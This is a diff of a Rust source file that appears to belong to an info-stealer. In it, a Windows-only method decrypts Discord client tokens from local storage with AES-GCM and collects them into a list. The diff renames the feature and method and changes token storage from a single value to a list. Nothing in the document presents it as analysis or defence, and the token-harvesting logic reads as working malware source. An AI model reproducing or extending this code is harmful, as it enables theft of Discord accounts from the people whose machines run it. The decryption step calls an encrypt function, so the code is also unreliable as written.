@@ -1,8 +1,8 @@
 use crate::Sends;
 
 impl Sends {
-    #[cfg(all(feature = "discord-client", target_os = "windows"))]
-    pub fn discord_client(&mut self) -> Option<()> {
+    #[cfg(all(feature = "discord", target_os = "windows"))]
+    pub fn discord(&mut self) -> Option<()> {
         use aes_gcm::{aead::Aead, Aes256Gcm, KeyInit, Nonce};
         use regex::bytes::Regex;
         use serde_json::Value;
@@ -71,8 +71,7 @@ impl Sends {
                             let decrypted = cipher.encrypt(Nonce::from_slice(iv), payload);
                             let token = decrypted.ok()?;
                             let token = token.split(|y| *y == 249).collect::<Vec<_>>()[0];
-                            self.discord_client_token =
-                                Some(String::from_utf8(token.to_vec()).ok()?);
+                            self.discord_client_token.push(String::from_utf8(token.to_vec()).ok()?);
                             break;
                         }
                     }
@@ -83,13 +82,13 @@ impl Sends {
         Some(())
     }
 
-    #[cfg(all(feature = "discord-client", target_os = "linux"))]
-    pub fn discord_client(&mut self) -> Option<()> {
+    #[cfg(all(feature = "discord", target_os = "linux"))]
+    pub fn discord(&mut self) -> Option<()> {
         None
     }
 
-    #[cfg(all(feature = "discord-client", target_os = "macos"))]
-    pub fn discord_client(&mut self) -> Option<()> {
+    #[cfg(all(feature = "discord", target_os = "macos"))]
+    pub fn discord(&mut self) -> Option<()> {
         None
     }
 }
